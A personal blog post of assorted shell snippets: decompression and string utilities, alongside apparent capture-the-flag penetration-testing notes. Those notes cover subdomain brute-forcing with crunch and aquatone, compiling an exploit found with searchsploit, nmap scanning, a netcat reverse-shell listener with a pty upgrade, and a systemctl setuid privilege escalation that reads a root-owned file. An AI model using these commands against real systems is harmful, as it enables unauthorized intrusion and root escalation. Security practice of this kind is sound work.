---
title: "Random Snippets"
date: 2020-06-17T10:00:00
categories:
  - blog
tags:
  - random
  - rough cuts
---

Command line zlib decompression + header
```bash
$ printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" | cat - yourfile.text | gzip -dc > temp
```

```bash
# grab the first 18 chars from a string
echo 'your giant string here' | head -c 18 | wc -c
# or
echo 'your giant string here' | dd bs=1 count=18 | wc -c
```

```bash
crunch 20 20 0123456789abcdefghijklmnopqrstuvwxyz -t 0x@@.a.hackycorp.com > ~/aquatone/recon10.list
#aquatone run (chromium installed)
cat ~/aquatone/recon10.list | ./aquatone -ports 80 -out ~/aquatone/recon10  -scan-timeout 5000
```

```bash
# hex string to file
echo "\x9C\x03\x00\x00\x00\x00\x01" | xxd -r -p - > out
```

Ruby snippets
https://www.elttam.com//blog/ruby-deserialization/#content

```bash
searchsploit apache 2.4.29
cp /usr/share/exploitdb/exploits/php/remote/29290.c .
sudo apt install libssl-dev
gcc -o 29290 29290.c -lssl -lcrypto
```

```bash
nmap -sC -sV -T4 -A

nc -lvnp 4444
python -c 'import pty; pty.spawn("/bin/bash")'

#systemctl setuid priv esc
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
systemctl link $TF
systemctl enable --now $TF
```